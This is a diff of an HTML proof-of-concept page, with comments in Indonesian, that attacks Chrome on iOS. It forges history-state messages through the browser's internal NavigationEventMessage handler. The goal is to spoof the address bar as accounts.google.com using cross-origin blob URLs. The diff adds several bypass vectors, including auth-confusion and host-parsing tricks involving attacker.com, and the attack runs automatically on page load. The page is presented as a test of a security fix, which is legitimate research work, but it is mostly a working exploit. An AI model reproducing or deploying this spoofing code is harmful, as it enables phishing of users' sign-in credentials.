@@ -2,143 +2,147 @@
 <html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>PoC Verification - Blob URL Origin Check</title>
+    <title>Advanced PoC Bypass Test - Commit 8291494</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #f4f6f8; color: #333; }
-        .card { background: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-bottom: 20px; }
-        h1 { color: #d93025; font-size: 22px; margin-top: 0; }
-        .success { color: #137333; font-weight: bold; }
-        .danger { color: #c5221f; font-weight: bold; }
-        pre { background: #202124; color: #e8eaed; padding: 12px; border-radius: 6px; font-size: 12px; overflow-x: auto; }
-        button { background: #1a73e8; color: white; border: none; padding: 10px 18px; font-size: 14px; border-radius: 4px; cursor: pointer; }
-        button:hover { background: #1557b0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #fff5f5; color: #202124; }
+        .card { background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); margin-bottom: 20px; }
+        h1 { color: #d93025; font-size: 20px; margin-top: 0; }
+        .info { color: #1a73e8; font-weight: bold; }
+        pre { background: #202124; color: #f8f9fa; padding: 12px; border-radius: 6px; font-size: 12px; overflow-x: auto; }
+        .btn-group { margin-top: 15px; }
+        button { background: #d93025; color: white; border: none; padding: 10px 16px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #b31412; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h1>Validasi Perbaikan: Cross-Origin Blob PoC</h1>
-    <p>Halaman ini menguji apakah fungsi validasi *history state* pada perbaikan terbaru berhasil menolak *cross-origin blob URL* (misalnya menargetkan <code>accounts.google.com</code>).</p>
-    <p>Status Real Origin Dokumen: <code id="real-origin">Memuat...</code></p>
-    <button id="manual-trigger" style="display:none;">Jalankan Serangan Secara Manual</button>
+    <h1>Advanced PoC: Bypass Testing for Commit 8291494</h1>
+    <p>Skrip ini menguji ketahanan fungsi <code>IsSameOriginWith</code> terhadap variasi URL non-standard dan *cross-origin blob*.</p>
+    <p>Asal Dokumen Saat Ini (Real Origin): <code id="current-origin" class="info">Memuat...</code></p>
+    
+    <div class="btn-group">
+        <button id="run-bypass">Jalankan Uji Coba Serangan Bypass</button>
+    </div>
 </div>
 
 <div class="card">
     <h3>Log Eksekusi & Hasil Diagnostik:</h3>
-    <pre id="log-output">[*] Menginisialisasi skrip pengujian...\n</pre>
+    <pre id="console-log">[*] Menyiapkan lingkungan pengujian bypass...\n</pre>
 </div>
 
 <script>
 (function() {
-    // Konfigurasi target domain yang ingin disspoof
     const TARGET_VICTIM = "accounts.google.com";
-    const spoofedBlobUrl = "blob:https://" + TARGET_VICTIM + "/signin-spoof-test";
+    
+    // Vektor uji coba bypass: Mencoba berbagai format blob URL & skema tricky
+    const bypassVectors = [
+        "blob:https://" + TARGET_VICTIM + "/signin-direct-spoof",
+        "blob:https://" + TARGET_VICTIM + "@attacker.com/signin", // Percobaan Auth Confusion
+        "blob:https://attacker.com:443@" + TARGET_VICTIM + "/signin", // Manipulasi Host Parsing
+        "blob:http://" + TARGET_VICTIM + "/signin" // Cross-scheme blob (HTTP ke HTTPS target)
+    ];
 
-    function logMessage(msg) {
-        const pre = document.getElementById('log-output');
+    function log(msg) {
+        const pre = document.getElementById('console-log');
         pre.textContent += msg + '\n';
-        console.log('[PoC-Test] ' + msg);
+        console.log('[PoC-Bypass] ' + msg);
     }
 
-    // Tampilkan asal dokumen saat ini
-    document.getElementById('real-origin').textContent = location.origin || '(opaque/null)';
-    logMessage('[-] Current location.href = ' + location.href);
-    logMessage('[-] Current location.origin = ' + location.origin);
+    document.getElementById('current-origin').textContent = location.origin || '(opaque)';
+    log('[-] location.href = ' + location.href);
+    log('[-] location.origin = ' + location.origin);
 
-    // 1. Deteksi Handler Navigasi (Khusus iOS Chrome)
-    const messageHandlers = (window.webkit && window.webkit.messageHandlers) || {};
-    if (!messageHandlers.NavigationEventMessage) {
-        logMessage('[!] INFO: Handler "NavigationEventMessage" tidak ditemukan.');
-        logMessage('[!] Kemungkinan besar browser ini bukan Chrome di iOS atau mekanisme handler telah diisolasi.');
+    // Deteksi Handler Navigasi iOS Chrome
+    const mh = (window.webkit && window.webkit.messageHandlers) || {};
+    if (!mh.NavigationEventMessage) {
+        log('[!] WARNING: Handler NavigationEventMessage tidak ditemukan. Pastikan berjalan di Chrome on iOS.');
         return;
     }
-    logMessage('[+] Handler "NavigationEventMessage" terdeteksi aktif.');
+    log('[+] Handler NavigationEventMessage terdeteksi.');
 
-    // 2. Mengambil Frame ID dari lingkungan Page-World (__gCrWeb)
+    // Ambil Frame ID
     let frameId = null;
     try {
         if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
             frameId = window.__gCrWeb.getFrameId();
-            logMessage('[+] Berhasil mendapatkan frame_id via __gCrWeb.getFrameId() = ' + frameId);
+            log('[+] Berhasil membaca frame_id: ' + frameId);
         }
-    } catch (err) {
-        logMessage('[!] Gagal membaca frame_id langsung: ' + err.message);
+    } catch (e) {
+        log('[!] Gagal membaca frame_id secara langsung: ' + e.message);
     }
 
-    // Fallback pencarian akses frameId jika struktur namespace berbeda
     if (!frameId) {
-        const fallbackAccessors = [
+        // Fallback pencarian frameId
+        const fallbacks = [
             () => window.__gCrWeb.common.getFrameId(),
             () => window.__gCrWeb.message.getFrameId(),
             () => window.__gCrWeb.frameId
         ];
-        for (let i = 0; i < fallbackAccessors.length && !frameId; i++) {
-            try {
-                frameId = fallbackAccessors[i]();
-                logMessage('[+] Berhasil mendapatkan frame_id via fallback [' + i + '] = ' + frameId);
-            } catch(e) {}
+        for (let i = 0; i < fallbacks.length && !frameId; i++) {
+            try { frameId = fallbacks[i](); log('[+] Frame ID didapat via fallback [' + i + ']'); } catch(err){}
         }
     }
 
     if (!frameId) {
-        logMessage('[-] GAGAL: Tidak dapat membaca frame_id dari page-world. Eksekusi dihentikan.');
+        log('[-] GAGAL: Tidak dapat menemukan frame_id yang valid. Eksekusi dihentikan.');
         return;
     }
 
-    // 3. Pemicu Pendaftaran Frame (Mencegah Race Condition Timing)
-    function forceRegisterFrame() {
+    // Pemicu pendaftaran frame
+    function triggerRegister() {
         try {
             if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
                 window.__gCrWeb.registerFrame();
-                logMessage('[*] Pemanggilan __gCrWeb.registerFrame() berhasil.');
             } else if (window.__gCrWeb && window.__gCrWeb.crweb && typeof window.__gCrWeb.crweb.registerFrame === 'function') {
                 window.__gCrWeb.crweb.registerFrame();
-                logMessage('[*] Pemanggilan __gCrWeb.crweb.registerFrame() berhasil.');
             }
-        } catch (e) {
-            logMessage('[!] Catatan: registerFrame dilewati atau dikelola secara native.');
-        }
+        } catch (err) {}
     }
 
-    forceRegisterFrame();
+    triggerRegister();
 
-    // 4. Eksekusi Pengiriman Pesan (Bypass Attempt)
-    function executeBypassAttempt(attemptNumber) {
-        try {
-            // Kirim willChangeState
-            messageHandlers.NavigationEventMessage.postMessage({
-                command: 'willChangeState',
-                frame_id: frameId
-            });
+    // Fungsi Eksekusi Serangan dengan Vektor Bypass
+    function executeAttack() {
+        bypassVectors.forEach((vectorUrl, index) => {
+            try {
+                log('\n[*] Mencoba Vektor Bypass #' + (index + 1) + ':');
+                log('    Target URL -> ' + vectorUrl);
 
-            // Kirim didReplaceState dengan target cross-origin blob URL
-            messageHandlers.NavigationEventMessage.postMessage({
-                command: 'didReplaceState',
-                frame_id: frameId,
-                stateObject: '',
-                baseUrl: 'https://x/',
-                pageUrl: spoofedBlobUrl
-            });
+                // Kirim willChangeState
+                mh.NavigationEventMessage.postMessage({
+                    command: 'willChangeState',
+                    frame_id: frameId
+                });
 
-            logMessage('[' + attemptNumber + '] Pesan didReplaceState dikirim dengan target: ' + spoofedBlobUrl);
-            logMessage('[*] Memeriksa apakah perbaikan aktif: Jika perbaikan berhasil, navigasi/URL akan ditolak/diabaikan oleh fungsi IsHistoryStateChangeValid.');
-        } catch (err) {
-            logMessage('[!] Exception saat postMessage: ' + err.message);
-        }
+                // Kirim didReplaceState dengan URL target bypass
+                mh.NavigationEventMessage.postMessage({
+                    command: 'didReplaceState',
+                    frame_id: frameId,
+                    stateObject: '',
+                    baseUrl: 'https://x/',
+                    pageUrl: vectorUrl
+                });
+
+                log('    [>] Pesan terkirim. Memeriksa respon browser...');
+            } catch (ex) {
+                log('    [!] Error saat postMessage: ' + ex.message);
+            }
+        });
+        
+        log('\n[INFO] Jika perbaikan commit 8291494 efektif, seluruh vektor di atas akan ditolak oleh url::IsSameOriginWith, sehingga address bar tidak akan berubah (menjadi no-op).');
     }
 
-    // Penjadwalan percobaan bertahap (retry mechanism untuk mengatasi delay sinkronisasi frame)
-    setTimeout(() => executeBypassAttempt(1), 100);
-    setTimeout(() => { forceRegisterFrame(); executeBypassAttempt(2); }, 400);
-    setTimeout(() => executeBypassAttempt(3), 1000);
-
-    // Tombol manual jika eksekusi otomatis diblokir kebijakan browser
-    const btn = document.getElementById('manual-trigger');
-    btn.style.display = 'inline-block';
-    btn.onclick = function() {
-        forceRegisterFrame();
-        executeBypassAttempt('Manual');
+    document.getElementById('run-bypass').onclick = function() {
+        triggerRegister();
+        executeAttack();
     };
+
+    // Auto-run setelah jeda singkat
+    setTimeout(() => {
+        triggerRegister();
+        executeAttack();
+    }, 500);
 
 })();
 </script>
